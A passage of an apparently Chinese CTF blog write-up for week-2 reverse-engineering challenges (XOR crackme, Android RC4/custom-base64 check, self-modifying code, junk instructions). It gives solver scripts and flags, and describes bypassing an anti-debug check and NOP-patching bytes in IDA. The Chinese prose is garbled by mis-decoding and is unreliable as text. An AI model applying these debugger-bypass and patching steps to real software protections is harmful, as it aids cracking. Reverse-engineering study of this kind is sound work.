class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">    art = <span class="string">&#x27;\n              ___                                                                      \n    //   ) )     / /    //   ) )  // | |     / /        // | |  \\ / / \\    / /       \n   //___/ /     / /    //        //__| |    / /        //__| |   \\  /   \\  / /        \n  / ____ /     / /    //  ____  / ___  |   / /        / ___  |   / /     \\/ /         \n //           / /    //    / / //    | |  / /        //    | |  / /\\     / /          \n//           / /___ ((____/ / //     | | / /____/ / //     | | / /  \\   / /           \n                                                                                       \n     / /        //   / / ||   / / //   / /  / /       /__  ___/ ||   / |  / / //   ) ) \n    / /        //____    ||  / / //____    / /          / /     ||  /  | / / //   / /  \n   / /        / ____     || / / / ____    / /          / /      || / /||/ / //   / /   \n  / /        //          ||/ / //        / /          / /       ||/ / |  / //   / /    \n / /____/ / //____/ /    |  / //____/ / / /____/ /   / /        |  /  | / ((___/ /     \n&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(art)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(<span class="built_in">input</span>(<span class="string">&#x27;Please give me the flag: &#x27;</span>).encode())</span><br><span class="line"></span><br><span class="line">enc = [</span><br><span class="line">    <span class="number">115</span>,</span><br><span class="line">    <span class="number">121</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">110</span>,</span><br><span class="line">    <span class="number">76</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">96</span>,</span><br><span class="line">    <span class="number">88</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">113</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">103</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">96</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">70</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">118</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">123</span>,</span><br><span class="line">    <span class="number">113</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">79</span>,</span><br><span class="line">    <span class="number">82</span>,</span><br><span class="line">    <span class="number">84</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">84</span>,</span><br><span class="line">    <span class="number">77</span>,</span><br><span class="line">    <span class="number">76</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">99</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">102</span>,</span><br><span class="line">    <span class="number">86</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">104</span>]</span><br><span class="line">data = hello()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    data[i] = data[i] ^ <span class="number">21</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">bytearray</span>(enc) == data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;WOW!!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;I believe you can do it!&#x27;</span>)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&#x27;To be continue...&#x27;</span>)</span><br><span class="line"><span class="comment">#ä»£ç å¾ˆç®€å•ï¼Œå°±æ˜¯ä½ è¾“å…¥çš„çš„è‡³äº¦æˆ–21ä¸encæ¯”è¾ƒï¼Œé‚£æˆ‘ä»¬ç›´æ¥äº¦æˆ–å›æ¥å³å¯</span></span><br><span class="line"><span class="comment">#poc:</span></span><br><span class="line">enc = [</span><br><span class="line">    <span class="number">115</span>,</span><br><span class="line">    <span class="number">121</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">110</span>,</span><br><span class="line">    <span class="number">76</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">96</span>,</span><br><span class="line">    <span class="number">88</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">113</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">103</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">96</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">70</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">118</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">123</span>,</span><br><span class="line">    <span class="number">113</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">79</span>,</span><br><span class="line">    <span class="number">82</span>,</span><br><span class="line">    <span class="number">84</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">84</span>,</span><br><span class="line">    <span class="number">77</span>,</span><br><span class="line">    <span class="number">76</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">99</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">102</span>,</span><br><span class="line">    <span class="number">86</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">104</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    enc[i] = enc[i] ^ <span class="number">21</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(enc[i]),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#flag&#123;Y0uMade1tThr0ughT2eSec0ndPZGALAXY1eve1T2at1sC001&#125;</span></span><br></pre></td></tr></table></figure><h5 id="WEEK2-REVERSE-AndroGenshin"><a href="#WEEK2-REVERSE-AndroGenshin" class="headerlink" title="WEEK2|REVERSE AndroGenshin"></a>WEEK2|REVERSE AndroGenshin</h5><p>emmm ï¼Œç ”ç©¶äº†ä¸€ä¸‹åˆï¼Œï¼Œæœ¬æ¥apkä»¥å‰éƒ½æ˜¯æ‹–åˆ°Androidkillé‡Œï¼Œä½†æ˜¯æœ‰æ—¶å€™ï¼Œå¤§çš„apkä¼šå¡ä½ï¼Œæå–ä¸åˆ°æºç ï¼Œä¸æ˜¯æ‰“reçš„ï¼Œä¹Ÿå°±æ²¡æœ‰æ•´è¿‡apkç¯å¢ƒï¼Œ</p><p>è¿™é‡Œç®€å•çš„è§£é‡Šä¸€ä¸‹é€†å‘ç¯å¢ƒçš„é—®é¢˜ï¼Œ</p><p><code>dex2jar-2.0</code> æ˜¯é€†å‘çš„  å…ˆæŠŠapkæ”¹æˆzip,ç„¶åé€‰æ‹©dexé‡Œé¢çš„ç”¨dex2jaré€†æˆjar,ç„¶åå†ç”¨jdguiæ‰“å¼€ï¼Œå¾ˆéº»çƒ¦ï¼Œè€Œä¸”ä¸æ˜¯å¾ˆå‡†ï¼Œè¿˜æ˜¯jdxå¥½ç”¨ï¼Œguiçš„ï¼Œç›´æ¥æ‹–apkå³å¯ï¼Œé€‚åˆæˆ‘è¿™ç§èœé¸¡ã€‚ä¸‹è½½åœ°å€<code>https://github.com/skylot/jadx</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (!username.equals(<span class="string">&quot;genshinimpact&quot;</span>)) &#123; <span class="comment">//username = genshinimpact</span></span><br><span class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>, (<span class="keyword">int</span>) R.string.wrong1, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span>[] base64_table = &#123;<span class="number">125</span>, <span class="number">239</span>, <span class="number">101</span>, <span class="number">151</span>, <span class="number">77</span>, <span class="number">163</span>, <span class="number">163</span>, <span class="number">110</span>, <span class="number">58</span>, <span class="number">230</span>, <span class="number">186</span>, <span class="number">206</span>, <span class="number">84</span>, <span class="number">84</span>, <span class="number">189</span>, <span class="number">193</span>, <span class="number">30</span>, <span class="number">63</span>, <span class="number">104</span>, <span class="number">178</span>, <span class="number">130</span>, <span class="number">211</span>, <span class="number">164</span>, <span class="number">94</span>, <span class="number">75</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">193</span>, <span class="number">160</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">30</span>, <span class="number">127</span>, <span class="number">157</span>, <span class="number">66</span>, <span class="number">163</span>, <span class="number">181</span>, <span class="number">177</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">236</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">144</span>, <span class="number">231</span>, <span class="number">250</span>, <span class="number">16</span>, <span class="number">36</span>, <span class="number">34</span>, <span class="number">91</span>, <span class="number">9</span>, <span class="number">188</span>, <span class="number">81</span>, <span class="number">5</span>, <span class="number">241</span>, <span class="number">235</span>, <span class="number">3</span>, <span class="number">54</span>, <span class="number">150</span>, <span class="number">40</span>, <span class="number">119</span>, <span class="number">202</span>, <span class="number">150</span>&#125;;</span><br><span class="line">    String retval = it_is_not_RC4.rc4(username, base64_table);</span><br><span class="line">    String result2 = it_is_not_base64.encode(password.getBytes(), retval);</span><br><span class="line">    <span class="keyword">if</span> (!result2.equals(<span class="string">&quot;YnwgY2txbE8TRyQecyE1bE8DZWMkMiRgJW1=&quot;</span>)) &#123;</span><br><span class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>, (<span class="keyword">int</span>) R.string.wrong2, <span class="number">0</span>).show();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeText(MainActivity.<span class="keyword">this</span>, (<span class="keyword">int</span>) R.string.Congratulate, <span class="number">0</span>).show();</span><br><span class="line">    Intent intent = <span class="keyword">new</span> Intent(MainActivity.<span class="keyword">this</span>, MainActivity2.class);</span><br><span class="line">    MainActivity.<span class="keyword">this</span>.startActivity(intent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçœ‹ä¸€ä¸‹ä»£ç ï¼Œusername ä¸ºkeyï¼Œtableä¸ºå€¼ï¼ŒåŠç”¨it_is_not_RC4ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¾“å‡ºä¸€ä¸‹ï¼Œç”¨javaï¼Œ</p><p><img src="/images/xinshengsai/image-20231117164940894.png" alt="image-20231117164940894"></p><p>å¯ä»¥å¾—åˆ°<code>BADCFEHGJILKNMPORQTSVUXWZYbadcfehgjilknmporqtsvuxwzy1032547698/+</code></p><p>è¿™æ ·ä¸€çŒœåº”è¯¥å°±æ˜¯base64æ¢è¡¨äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;YnwgY2txbE8TRyQecyE1bE8DZWMkMiRgJW1=&quot;</span></span><br><span class="line"></span><br><span class="line">string1 = <span class="string">&quot;BADCFEHGJILKNMPORQTSVUXWZYbadcfehgjilknmporqtsvuxwzy1032547698/+&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br></pre></td></tr></table></figure><p><img src="/images/xinshengsai/image-20231117165100510.png" alt="image-20231117165100510"></p><h5 id="WEEK2-REVERSE-SMC"><a href="#WEEK2-REVERSE-SMC" class="headerlink" title="WEEK2|REVERSE SMC"></a>WEEK2|REVERSE SMC</h5><p>ç¨‹åºæ˜¯32ä½çš„</p><p><img src="/images/xinshengsai/image-20231120112522517.png" alt="image-20231120112522517">mainå‡½æ•°ä¼ªç ï¼Œ</p><p><img src="/images/xinshengsai/image-20231120104810219.png" alt="image-20231120104810219"><br>ç„¶åæ‰§è¡Œäº†è¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ª<br><img src="/images/xinshengsai/image-20231120105442011.png" alt="image-20231120105442011"></p><p>å¾—åˆ°äº†ä¸€ä¸ªresultï¼Œä»–çš„å€¼ç”¨shift+eæ‹‰å‡ºæ¥å°±è¡Œï¼Œ</p><p><img src="/images/xinshengsai/image-20231120162135987.png" alt="image-20231120162135987"></p><p>æ¥ä¸‹æ¥æ˜¯è°ƒè¯•ï¼Œè§£å¯†è¿™ä¸ªå‡½æ•°ã€‚ä¸‹æ–­ç‚¹ï¼Œ</p><p><img src="/images/xinshengsai/image-20231120155232948.png" alt="image-20231120155232948"></p><p>ç›´æ¥é€‰ä¸­å‰é¢çš„ç‚¹ï¼Œç„¶ååœ¨ä¸Šé¢é€‰ä¸­è¿™ä¸ªlocal debuger</p><p><img src="/images/xinshengsai/image-20231120155259699.png" alt="image-20231120155259699"></p><p>è¿è¡Œç‚¹yeså³å¯ï¼Œç„¶åéšä¾¿è¾“å…¥ä¸ªå­—ç¬¦ç¡®å®šï¼Œå°±è¿›å…¥äº†ï¼Œ</p><p><img src="/images/xinshengsai/image-20231120155459409.png" alt="image-20231120155459409"></p><p>è¿™ä¸ªåœ°æ–¹æ˜¯ä¸€ä¸ªé˜²æ­¢debugerçš„åœ°æ–¹ï¼Œæˆ‘åœ¨æˆ‘è¿™ä¸ªidaé‡Œè°ƒè¯•äº†å‡ æ¬¡ï¼Œæˆ‘è¿™é‡Œç›´æ¥å°±zfä¸º1ï¼Œç»•è¿‡è¿™ä¸ªdebugeräº†ï¼Œå¤§ä½¬çš„è§†é¢‘ä¸­ï¼Œéœ€è¦æ”¹ä¸€ä¸‹ç»•è¿‡</p><p><img src="/images/xinshengsai/image-20231120155637467.png" alt="image-20231120155637467"></p><p>å³ä¸Šè§’ä¸­æŠŠzfæ”¹ä¸º1ï¼Œå¤§ä½¬è§£é‡Šè¯´å°±æ˜¯ifåˆ¤æ–­ï¼Œ1å°±æ˜¯ç›´æ¥è¿›å…¥å˜›ï¼Œ</p><p><img src="/images/xinshengsai/image-20231120155949184.png" alt="image-20231120155949184"></p><p>ç„¶åå›åˆ°ä»£ç è¿›è¡Œè§£ç <code>é€‰ä¸­æŒ‰C,ä¹Ÿå°±æ˜¯codeçš„æ„æ€</code>yes</p><p><img src="/images/xinshengsai/image-20231120160055370.png" alt="image-20231120160055370"></p><p>ç„¶åä¼šæŠŠæ–­ç‚¹è¿™å—æ”¹æˆä»£ç </p><p><img src="/images/xinshengsai/image-20231120160134511.png" alt="image-20231120160134511"></p><p>ç„¶åæŒ‰pé”®è®©idaæŠŠè¿™æ®µä»£ç è½¬æ¢æˆå‡½æ•°ï¼Œè¿™æ ·å°±è¿˜æœ‰ä¸€ç‚¹ç‚¹äº†ï¼Œ</p><p><img src="/images/xinshengsai/image-20231120160305351.png" alt="image-20231120160305351"></p><p><img src="/images/xinshengsai/image-20231120160958026.png" alt="image-20231120160958026"></p><p>è¿™æ ·å°±æˆä¸ºäº†ä¸€ä¸ªå‡½æ•°ï¼Œåœ¨æŒ‰tabï¼Œå°±èƒ½çœ‹åˆ°ä»£ç äº†ï¼Œ</p><p><img src="/images/xinshengsai/image-20231120161048660.png" alt="image-20231120161048660"></p><p>å…ˆäº¦æˆ–åœ¨åŠ 5</p><p>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a = [</span><br><span class="line">    <span class="number">0x7C</span>, <span class="number">0x82</span>, <span class="number">0x75</span>, <span class="number">0x7B</span>, <span class="number">0x6F</span>, <span class="number">0x47</span>, <span class="number">0x61</span>, <span class="number">0x57</span>, <span class="number">0x53</span>, <span class="number">0x25</span>, </span><br><span class="line">  <span class="number">0x47</span>, <span class="number">0x53</span>, <span class="number">0x25</span>, <span class="number">0x84</span>, <span class="number">0x6A</span>, <span class="number">0x27</span>, <span class="number">0x68</span>, <span class="number">0x27</span>, <span class="number">0x67</span>, <span class="number">0x6A</span>, </span><br><span class="line">  <span class="number">0x7D</span>, <span class="number">0x84</span>, <span class="number">0x7B</span>, <span class="number">0x35</span>, <span class="number">0x35</span>, <span class="number">0x48</span>, <span class="number">0x25</span>, <span class="number">0x7B</span>, <span class="number">0x7E</span>, <span class="number">0x6A</span>, </span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x71</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>( <span class="built_in">chr</span>((i - <span class="number">5</span> )^<span class="number">0x11</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#flag&#123;SMC_1S_1nt3r3sting!!R1ght?&#125;</span></span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<code>https://www.bilibili.com/video/BV1Cu4y1s7ab/?spm_id_from=333.999.0.0</code></p><h5 id="WEEK2-REVERSE-Petals"><a href="#WEEK2-REVERSE-Petals" class="headerlink" title="WEEK2|REVERSE Petals"></a>WEEK2|REVERSE Petals</h5><p>èŠ±æŒ‡ä»¤</p><p><img src="/images/xinshengsai/image-20231121100726785.png" alt="image-20231121100726785"></p><p><img src="/images/xinshengsai/image-20231121100739187.png" alt="image-20231121100739187"></p><p><code>ç»å…¸èŠ±æŒ‡ä»¤ï¼Œjz jnz  jzä»£è¡¨jump zero ä¸º 0çš„æ—¶å€™è·³è½¬ jnzä»£è¡¨ jump not zeroä¸ºä¸æ˜¯0çš„æ—¶å€™è·³è½¬ã€‚ä»£è¡¨zf 0æˆ–è€…1 ï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯æ— è®ºå¦‚ä½•éƒ½è·³è½¬åˆ° 13B0+1 </code></p><p><img src="/images/xinshengsai/image-20231121101108265.png" alt="image-20231121101108265"></p><p>option-ã€‹general æ˜¾ç¤ºæœºå™¨ç ï¼Œ</p><p><img src="/images/xinshengsai/image-20231121101137945.png" alt="image-20231121101137945"></p><p><code>13B0+1  ä¹Ÿå°±æ˜¯C7</code></p><p><img src="/images/xinshengsai/image-20231121101226560.png" alt="image-20231121101226560"></p><p>é€‰ä¸­è¿™é‡Œçˆ†çº¢çš„æŒ‰Uï¼Œå¯ä»¥æŠŠ13b1 ç»™æ˜¾ç¤ºå‡ºæ¥ï¼Œ</p><p><img src="/images/xinshengsai/image-20231121101356497.png" alt="image-20231121101356497"></p><p>æŒ‰cè®©è¿™æ®µ13b0 è¯†åˆ«æˆä»£ç ï¼Œ</p><p><img src="/images/xinshengsai/image-20231121101556557.png" alt="image-20231121101556557"></p><p>13b0 æ˜¯ä¸ä¼šè·³åˆ°é‡Œé¢çš„ï¼Œä½†æ˜¯ä¼šé˜»æ‰°æˆ‘ä»¬åç¼–è¯‘ï¼Œè¿™æ ·æŠŠ0xe8æ”¹ä¸º0x90,å°±æ˜¯è®©ä»–å•¥ä¹Ÿä¸å¹²ï¼ŒæŒ‰cé”®nop,ä»€ä¹ˆä¹Ÿä¸åš</p><p><img src="/images/xinshengsai/image-20231121101808634.png" alt="image-20231121101808634"></p><p>ç„¶ååˆ°ç¨‹åºå¼€å¤´çš„åœ°æ–¹ï¼ŒæŒ‰ä¸‹pé”®ï¼Œæ”¹ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œåœ¨æŒ‰f5    æŸ¥çœ‹ä¼ªç </p><p><img src="/images/xinshengsai/image-20231121101959244.png" alt="image-20231121101959244"></p><p><img src="/images/xinshengsai/image-20231121102139568.png" alt="image-20231121102139568"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0xD0</span>, <span class="number">0xD0</span>, <span class="number">0x85</span>, <span class="number">0x85</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0xC5</span>, <span class="number">0x8A</span>, <span class="number">0x93</span>, <span class="number">0x89</span>,</span><br><span class="line">       <span class="number">0x92</span>, <span class="number">0x8F</span>, <span class="number">0x87</span>, <span class="number">0x88</span>, <span class="number">0x9F</span>, <span class="number">0x8F</span>, <span class="number">0xC5</span>, <span class="number">0x84</span>, <span class="number">0xD6</span>, <span class="number">0xD1</span>,</span><br><span class="line">       <span class="number">0xD2</span>, <span class="number">0x82</span>, <span class="number">0xD3</span>, <span class="number">0xDE</span>, <span class="number">0x87</span>]</span><br><span class="line">v5 = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v5[i] = (~(i ^ <span class="number">25</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(v5.index((enc[i])))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(hashlib.md5(flag.encode()).hexdigest())</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;d780c9b2d2aa9d40010a753bc15770de&#125;</span></span><br></pre></td></tr></table></figure><p>å‚è€ƒ<code>https://blog.csdn.net/Sciurdae/article/details/133925259</code></p><p><code>https://www.bilibili.com/video/BV13w411z7aP/?spm_id_from=333.999.0.0&amp;vd_source=0ea9fd49e9cb90fae591c5eb9cb390f4</code></p><h5 id="WEEK2-REVERSE-Cï¼ŸC-ï¼Ÿ"><a href="#WEEK2-REVERSE-Cï¼ŸC-ï¼Ÿ" class="headerlink" title="WEEK2|REVERSE Cï¼ŸC++ï¼Ÿ"></a>WEEK2|REVERSE Cï¼ŸC++ï¼Ÿ</h5><p><img src="/images/xinshengsai/image-20231121160004228.png" alt="image-20231121160004228"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">array1 = [<span class="number">68</span>,<span class="number">75</span>,<span class="number">66</span>,<span class="number">72</span>,<span class="number">99</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">78</span>,<span class="number">83</span>,<span class="number">74</span>,<span class="number">91</span>,<span class="number">86</span>,<span class="number">35</span>,<span class="number">39</span>,<span class="number">77</span>,<span class="number">85</span>,<span class="number">44</span>,<span class="number">89</span>,<span class="number">47</span>,<span class="number">92</span>,<span class="number">49</span>,<span class="number">88</span>,<span class="number">48</span>,<span class="number">91</span>,<span class="number">88</span>,<span class="number">102</span>,<span class="number">105</span>,<span class="number">51</span>,<span class="number">76</span>,<span class="number">115</span>,-<span class="number">124</span>,<span class="number">125</span>,<span class="number">79</span>,<span class="number">122</span>,-<span class="number">103</span>]</span><br><span class="line">text2 = <span class="string">&quot;NEWSTAR&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    array1[i] -= i ^ -(<span class="built_in">ord</span>(text2[i]) % <span class="number">4</span>)</span><br><span class="line">    array1[i+<span class="number">7</span>] -= <span class="built_in">ord</span>(text2[i]) % <span class="number">5</span></span><br><span class="line">    array1[i+<span class="number">14</span>] -= <span class="number">2</span>*i</span><br><span class="line">    array1[i+<span class="number">21</span>] -= i^<span class="number">2</span></span><br><span class="line">    array1[i+<span class="number">28</span>] -= <span class="built_in">ord</span>(text2[i]) // <span class="number">5</span> + <span class="built_in">ord</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>):</span><br><span class="line">    array1[i] -= i</span><br><span class="line">    array1[i] += <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(array1[i]%<span class="number">256</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, </span><br><span class="line">0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, </span><br><span 